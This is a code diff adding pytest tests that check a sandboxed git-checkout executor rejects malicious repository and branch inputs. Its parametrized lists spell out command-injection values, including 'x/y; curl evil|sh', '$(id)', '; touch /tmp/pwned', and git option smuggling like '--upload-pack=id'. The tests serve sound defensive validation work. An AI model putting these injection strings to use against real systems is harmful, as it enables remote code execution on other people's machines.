@@ -140,3 +140,65 @@ def test_checkout_is_single_branch_and_creates_work_branch():
         assert again["branch"] == "anvil/rtems-1"
     finally:
         sb.stop()
+
+
+# -- input validation at the shell boundary (codex review of #8) --------------------------------
+
+from anvil.runtime.executor import repo_path, validate_ref, validate_repo  # noqa: E402
+
+MALICIOUS_REPOS = ["x/y; curl evil|sh", "x/$(id)", "x/y`id`", "../etc", "x/..", "x/.", "x", "x/y/z",
+                   "x/y z", "x/y\nid", "", "x/-y\" ; id"]
+MALICIOUS_REFS = ["-bad", "--orphan=x", "main; id", "a..b", "a//b", "a/", "x.lock", "$(id)", "a b"]
+
+
+@pytest.mark.parametrize("repo", MALICIOUS_REPOS)
+def test_malicious_repo_rejected(repo):
+    with pytest.raises(ValueError):
+        validate_repo(repo)
+
+
+@pytest.mark.parametrize("ref", MALICIOUS_REFS)
+def test_malicious_ref_rejected(ref):
+    with pytest.raises(ValueError):
+        validate_ref(ref, "branch")
+
+
+def test_valid_inputs_pass():
+    assert validate_repo("vishal7pandey/rtems-lwip") == "vishal7pandey/rtems-lwip"
+    assert repo_path("vishal7pandey/rtems") == "/workspace/rtems"
+    assert validate_ref("tc1/5776-base", "base_ref") == "tc1/5776-base"
+    assert work_branch({"jira_key": "RTEMS-1", "run_id": "r"}) == "anvil/rtems-1"
+
+
+class RecordingSandbox:
+    id = "rec"
+
+    def __init__(self):
+        self.commands = []
+
+    def execute(self, command, timeout=None):
+        self.commands.append(command)
+        from deepagents.backends.protocol import ExecuteResponse
+        return ExecuteResponse(output="", exit_code=0)
+
+    def set_network(self, network):
+        self.commands.append(f"<network {network}>")
+
+
+@pytest.mark.parametrize("field,value", [("repo", "x/y; touch /tmp/pwned"), ("base_ref", "--upload-pack=id"),
+                                         ("branch", "-c core.sshCommand=id")])
+def test_checkout_executes_nothing_for_malicious_run(field, value):
+    sb = RecordingSandbox()
+    with pytest.raises(ValueError):
+        DeepAgentExecutor(image="unused").checkout(sb, {**RUN, field: value})
+    assert sb.commands == []
+
+
+async def test_start_reports_failed_setup_for_malicious_repo():
+    class Ex(DeepAgentExecutor):
+        def sandbox_for(self, run):
+            return RecordingSandbox()
+
+    events = await collect(Ex(image="unused").start({**RUN, "repo": "x/$(id)"}, "go"))
+    assert events[-1]["data"]["status"] == "failed"
+    assert "invalid repo" in events[-2]["data"]["text"]
